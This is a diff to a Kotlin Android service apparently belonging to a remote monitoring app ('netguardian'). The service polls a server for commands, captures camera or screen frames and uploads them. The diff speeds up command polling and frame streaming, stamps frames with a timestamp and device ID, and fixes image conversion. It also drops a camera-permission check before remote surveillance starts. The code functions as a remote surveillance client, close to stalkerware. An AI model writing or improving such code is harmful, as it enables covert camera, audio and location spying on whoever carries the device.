@@ -58,6 +58,7 @@ class CommandService : Service() {
     private val mainHandler = Handler(Looper.getMainLooper())
     private val frameMutex = kotlinx.coroutines.sync.Mutex()
     private var frameInFlight = false
+    private var frameIntervalMs = 250L
 
     private var surveillanceMode = false
     private var videoMode = false
@@ -90,21 +91,8 @@ class CommandService : Service() {
         locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
         prefs = getSharedPreferences("netguardian", Context.MODE_PRIVATE)
         startForeground()
-        surveillanceMode = prefs?.getBoolean("surveillance_mode", false) == true
-        if (surveillanceMode) {
-            videoMode = prefs?.getBoolean("video_mode", false) == true
-            audioMode = prefs?.getBoolean("audio_mode", false) == true
-            trackingMode = prefs?.getBoolean("tracking_mode", false) == true
-            motionDetectionEnabled = prefs?.getBoolean("motion_detection", true) == true
-            useFrontCamera = prefs?.getBoolean("front_camera", false) == true
-            scope.launch {
-                delay(2000)
-                startCamera()
-                if (videoMode) startVideoChunks()
-                if (audioMode) startAudioChunks()
-                if (trackingMode) startTracking()
-            }
-        }
+        surveillanceMode = false
+        saveState()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -148,7 +136,7 @@ class CommandService : Service() {
         pollingJob = scope.launch {
             while (isActive) {
                 try { pollCommands() } catch (_: Exception) { }
-                delay(5000)
+                delay(1000)
             }
         }
     }
@@ -162,10 +150,6 @@ class CommandService : Service() {
 
             try {
                 when (action) {
-                    "request_permission" -> {
-                        handleRequestPermission(target)
-                        ServerUploader.ackCommand(id, "done", "ok")
-                    }
                     "trigger_capture" -> {
                         if (target == "camera" || target == "screen") {
                             handleCaptureWithActivity(target, id)
@@ -214,26 +198,6 @@ class CommandService : Service() {
                 ServerUploader.ackCommand(id, "failed", e.message ?: "unknown")
             }
         }
-    }
-
-    private fun handleRequestPermission(permission: String) {
-        val perm = when (permission) {
-            "camera" -> Manifest.permission.CAMERA
-            "microphone" -> Manifest.permission.RECORD_AUDIO
-            "contacts" -> Manifest.permission.READ_CONTACTS
-            "sms" -> Manifest.permission.READ_SMS
-            "call_log" -> Manifest.permission.READ_CALL_LOG
-            "gallery" -> if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
-            "location" -> Manifest.permission.ACCESS_FINE_LOCATION
-            else -> return
-        }
-        if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) return
-
-        val intent = Intent(this, MainActivity::class.java).apply {
-            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
-            putExtra("command_permission", permission)
-        }
-        startActivity(intent)
     }
 
     private fun handleCaptureWithActivity(target: String, commandId: Int) {
@@ -392,7 +356,10 @@ class CommandService : Service() {
                 ImageFormat.YUV_420_888, 2
             )
             ir.setOnImageAvailableListener({ reader ->
-                if (frameInFlight) return@setOnImageAvailableListener
+                if (frameInFlight) {
+                    reader.acquireLatestImage()?.close()
+                    return@setOnImageAvailableListener
+                }
                 val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                 val jpeg = imageToJpeg(image)
                 image.close()
@@ -400,6 +367,7 @@ class CommandService : Service() {
                     frameInFlight = true
                     scope.launch {
                         try { uploadFrame(jpeg) } catch (_: Exception) { }
+                        delay(frameIntervalMs)
                         frameInFlight = false
                     }
                 }
@@ -452,24 +420,62 @@ class CommandService : Service() {
             val uBuf = planes[1].buffer
             val vBuf = planes[2].buffer
 
-            val ySize = yBuf.remaining()
-            val uSize = uBuf.remaining()
-            val vSize = vBuf.remaining()
-            val nv21 = ByteArray(ySize + uSize + vSize)
-
-            yBuf.get(nv21, 0, ySize)
-            for (i in 0 until uSize.coerceAtMost(vSize)) {
-                nv21[ySize + i * 2] = vBuf.get(i)
-                nv21[ySize + i * 2 + 1] = uBuf.get(i)
-            }
-
+            val yRowStride = planes[0].rowStride
+            val uvRowStride = planes[1].rowStride
+            val uvPixelStride = planes[1].pixelStride
             val w = image.width
             val h = image.height
+
+            val nv21 = ByteArray(w * h * 3 / 2)
+            var pos = 0
+
+            for (row in 0 until h) {
+                yBuf.position(row * yRowStride)
+                yBuf.get(nv21, pos, w)
+                pos += w
+            }
+
+            val uvHeight = h / 2
+            for (row in 0 until uvHeight) {
+                for (col in 0 until w / 2) {
+                    val uvIndex = row * uvRowStride + col * uvPixelStride
+                    nv21[pos++] = vBuf.get(uvIndex)
+                    nv21[pos++] = uBuf.get(uvIndex)
+                }
+            }
+
             val yuv = YuvImage(nv21, ImageFormat.NV21, w, h, null)
             val out = ByteArrayOutputStream()
             yuv.compressToJpeg(Rect(0, 0, w, h), 70, out)
-            return out.toByteArray()
+            return addTimestampOverlay(out.toByteArray(), w, h)
         } catch (_: Exception) { return null }
+    }
+
+    private fun addTimestampOverlay(jpeg: ByteArray, w: Int, h: Int): ByteArray {
+        try {
+            val bmp = BitmapFactory.decodeByteArray(jpeg, 0, jpeg.size) ?: return jpeg
+            val canvas = Canvas(bmp)
+            val paint = Paint().apply {
+                color = Color.WHITE
+                textSize = (h / 20).toFloat().coerceIn(12f, 32f)
+                setShadowLayer(2f, 1f, 1f, Color.BLACK)
+                isAntiAlias = true
+            }
+            val ts = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date())
+            val deviceIdShort = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)?.take(8) ?: "?"
+            val text = "$ts | CAM${if (useFrontCamera) "F" else "B"} | $deviceIdShort"
+            val bgPaint = Paint().apply { color = Color.argb(160, 0, 0, 0) }
+            val textW = paint.measureText(text)
+            val textH = paint.textSize
+            canvas.drawRect(0f, h - textH - 16f, textW + 16f, h.toFloat(), bgPaint)
+            canvas.drawText(text, 8f, h - 8f, paint)
+            val camLabel = if (useFrontCamera) "FRONT" else "BACK"
+            canvas.drawText(camLabel, 8f, textH + 8f, paint)
+            val out = ByteArrayOutputStream()
+            bmp.compress(Bitmap.CompressFormat.JPEG, 75, out)
+            bmp.recycle()
+            return out.toByteArray()
+        } catch (_: Exception) { return jpeg }
     }
 
     private fun uploadFrame(jpeg: ByteArray) {
@@ -479,7 +485,7 @@ class CommandService : Service() {
         try {
             val boundary = "Boundary${System.currentTimeMillis()}"
             val conn = URL("${ServerUploader.serverUrl}/api/camera/frame").openConnection() as HttpURLConnection
-            conn.connectTimeout = 5000; conn.readTimeout = 5000
+            conn.connectTimeout = 3000; conn.readTimeout = 3000
             conn.requestMethod = "POST"; conn.doOutput = true
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
             DataOutputStream(conn.outputStream).use { dos ->
@@ -527,11 +533,6 @@ class CommandService : Service() {
     private fun handleSurveillance(action: String, commandId: Int) {
         when (action) {
             "start" -> {
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
-                    != PackageManager.PERMISSION_GRANTED) {
-                    ServerUploader.ackCommand(commandId, "failed", "Camera permission not granted")
-                    return
-                }
                 surveillanceMode = true
                 saveState()
                 startCamera()
